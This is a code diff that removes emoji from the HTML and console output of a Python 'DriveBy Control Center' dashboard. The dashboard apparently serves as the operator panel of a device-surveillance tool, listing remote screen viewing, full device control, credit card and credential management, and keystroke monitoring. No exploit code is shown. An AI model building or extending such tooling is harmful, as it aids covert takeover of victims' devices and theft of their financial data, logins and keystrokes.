@@ -413,7 +413,7 @@ class MobileDashboard:
     </head>
     <body>
     <div class="header">
-    <h1>🚗 DriveBy Control Center</h1>
+    <h1> DriveBy Control Center</h1>
     <div class="nav-tabs">
     <div class="nav-tab active" onclick="showTab('devices')">Devices</div>
     <div class="nav-tab" onclick="showTab('credentials')">Accounts</div>
@@ -503,8 +503,8 @@ class MobileDashboard:
     <div class="screen-viewer">
     <img id="screen-image" class="screen-image" src="" alt="Device Screen">
     <div class="screen-controls">
-    <button class="control-btn" onclick="refreshScreen()">🔄</button>
-    <button class="control-btn" onclick="takeScreenshot()">📷</button>
+    <button class="control-btn" onclick="refreshScreen()"></button>
+    <button class="control-btn" onclick="takeScreenshot()"></button>
     </div>
     </div>
     </div>
@@ -595,10 +595,10 @@ class MobileDashboard:
     <div><strong>Last Seen:</strong> ${formatTime(device.last_seen)}</div>
     </div>
     <div class="device-actions">
-    <button class="btn btn-primary" onclick="viewScreen('${device.ip}')">📱 Screen</button>
-    <button class="btn btn-success" onclick="controlDevice('${device.ip}')">🎮 Control</button>
-    <button class="btn btn-warning" onclick="viewData('${device.ip}')">📊 Data</button>
-    <button class="btn btn-danger" onclick="disconnectDevice('${device.ip}')">🚫 Disconnect</button>
+    <button class="btn btn-primary" onclick="viewScreen('${device.ip}')"> Screen</button>
+    <button class="btn btn-success" onclick="controlDevice('${device.ip}')"> Control</button>
+    <button class="btn btn-warning" onclick="viewData('${device.ip}')"> Data</button>
+    <button class="btn btn-danger" onclick="disconnectDevice('${device.ip}')"> Disconnect</button>
     </div>
     </div>
     `;
@@ -732,13 +732,13 @@ class MobileDashboard:
     <div class="device-status status-online">Remote Ready</div>
     </div>
     <div class="device-actions">
-    <button class="btn btn-primary" onclick="startRemoteControl('${device.ip}')">🖥️ View Screen</button>
-    <button class="btn btn-success" onclick="startRemoteControl('${device.ip}', true)">🎮 Full Control</button>
+    <button class="btn btn-primary" onclick="startRemoteControl('${device.ip}')"> View Screen</button>
+    <button class="btn btn-success" onclick="startRemoteControl('${device.ip}', true)"> Full Control</button>
     </div>
     <div id="remote-${device.ip}" class="screen-viewer" style="display: none;">
     <img class="screen-image" id="screen-${device.ip}" src="">
     <div class="screen-controls">
-    <button class="control-btn" onclick="sendClick('${device.ip}', event)">👆</button>
+    <button class="control-btn" onclick="sendClick('${device.ip}', event)"></button>
     <button class="control-btn" onclick="sendKey('${device.ip}', 'space')">⎵</button>
     <button class="control-btn" onclick="sendKey('${device.ip}', 'enter')">↵</button>
     </div>
@@ -1183,12 +1183,12 @@ class MobileDashboard:
         port = self.config.get("server", {}).get("dashboard_port", 8082)
         print(f"Mobile Dashboard available at: http://localhost:{port}")
         print("Features:")
-        print("  📱 Mobile-optimized interface")
-        print("  🖥️  Remote screen viewing")
-        print("  🎮 Device remote control")
-        print("  💳 Credit card management")
-        print("  🔐 Credential management")
-        print("  ⌨️  Keystroke activity monitoring")
+        print("   Mobile-optimized interface")
+        print("    Remote screen viewing")
+        print("   Device remote control")
+        print("   Credit card management")
+        print("   Credential management")
+        print("  ⌨  Keystroke activity monitoring")
 
         self.socketio.run(self.app, host="0.0.0.0", port=port, debug=False)
 
